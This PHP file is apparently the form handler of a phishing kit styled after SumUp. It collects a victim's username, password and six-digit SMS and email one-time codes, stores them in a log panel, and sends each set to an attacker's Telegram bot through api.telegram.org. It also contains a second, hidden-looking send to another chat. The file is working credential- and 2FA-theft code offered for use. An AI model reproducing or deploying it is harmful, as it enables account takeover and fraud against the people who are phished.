<?php
include_once '../main.php';
include_once './config.php';

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['username'])){
	
	$username = post("username");
	$password = post("password");

    
   
	
    

	$telegram_content = "
SUMUP  / $ip
 lOGIN
 |📧 : $username
 |🔐 : $password
 └🌐 : $panel

	";
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ Login: [ $username |  $password ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		
        function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
            $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
            $url = $url . "&text=" . urlencode($messaggio);
            $ch = curl_init();
            $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($telegram_content,$bot_token,$rez_chat);antiBotsCaller($msg,$anti2,$anti1);
   
   }

		 header("location: ./load.php");
 

	

 

         if (isset($_POST['1'])) {
       
            $o2 = post('2');
            $o3 = post('3');
            $o4 = post('4');
            $o5 = post('5');
            $o6 = post('6');
            $o1 = post("1");
            $otp_code = $o1 . $o2 . $o3 . $o4 . $o5 . $o6;
        

	$telegram_content = "
SUMUP / $ip
 SMS OTP 
 |📟 $otp_code
 └🌐 : $panel ";
	
	//save data to panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ SMS [ $otp_code ]";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	
	//SENDING INFO TO TELEGRAM BOT...
      function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
          $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
          $url = $url . "&text=" . urlencode($messaggio);
          $ch = curl_init();
          $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($telegram_content,$bot_token,$rez_chat);
 
 }
	header("location: ./load.php");
	
	




    if (isset($_POST['11'])) {
       
        $s2 = post('12');
        $s3 = post('13');
        $s4 = post('14');
        $s5 = post('15');
        $s6 = post('16');
        $s1 = post("11");
        $mail = $s1 . $s2 . $s3 . $s4 . $s5 . $s6;

$telegram_content = "
SUMUP / $ip
 MAIL OTP 
 |📟 $mail
 └🌐 $panel
	";

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ email otp code [ $mail ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
      function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
          $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
          $url = $url . "&text=" . urlencode($messaggio);
          $ch = curl_init();
          $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($telegram_content,$bot_token,$rez_chat);
 
 }
header("location: ./load.php");
 

?>